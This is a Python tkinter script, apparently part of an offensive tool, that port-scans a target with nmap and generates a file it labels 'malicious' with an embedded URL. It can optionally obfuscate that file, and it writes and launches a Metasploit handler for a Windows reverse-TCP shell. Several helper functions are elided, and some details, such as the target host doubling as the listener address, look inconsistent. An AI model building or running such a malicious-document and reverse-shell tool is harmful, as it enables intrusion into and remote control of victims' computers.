import os
import time
import tkinter as tk
from tkinter import messagebox
import random
import string
import nmap
import requests

# ... (rest of the imports and functions remain the same)

class GUI:
    # ... (same as before)

    def generate(self):
        host = self.host_entry.get()
        image = self.image_entry.get()
        run_msf = self.run_msf_var.get()
        obfuscate = self.obfuscate_var.get()

        if not host or not image:
            messagebox.showerror("Error", "Please fill in all fields")
            return

        nm = nmap.PortScanner()
        nm.scan(host, '1-65535')

        open_ports = [port for port in nm[host]['tcp'].keys() if nm[host]['tcp'][port]['state'] == 'open']
        if not open_ports:
            messagebox.showerror("Error", "No open ports found")
            return

        port = random.choice(open_ports)
        print(f"[+] Using port {port} for payload")

        document_content = generateDocument(host, f"http://{host}:{port}/image.png")
        filename = writeDocument(document_content)

        if filename:
            messagebox.showinfo("Success", f"Malicious file generated: {filename}")

        if obfuscate == "yes":
            obfuscateDocument(filename)

        if run_msf == "yes":
            msf_script_template = f'''
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST {host}
set LPORT {port}
set ExitOnSession false
exploit -j -z
'''
            if generateMSFScript(host, msf_script_template):
                print('[+] Running Metasploit exploit module [+]')
                if os.system('msfconsole -q -r metasploit.rc') != 0:
                    print('[-] Error running Metasploit console [-]')
                    return False
            else:
                messagebox.showerror("Error", "Error generating Metasploit script")
                return

root = tk.Tk()
gui = GUI(root)
root.mainloop()
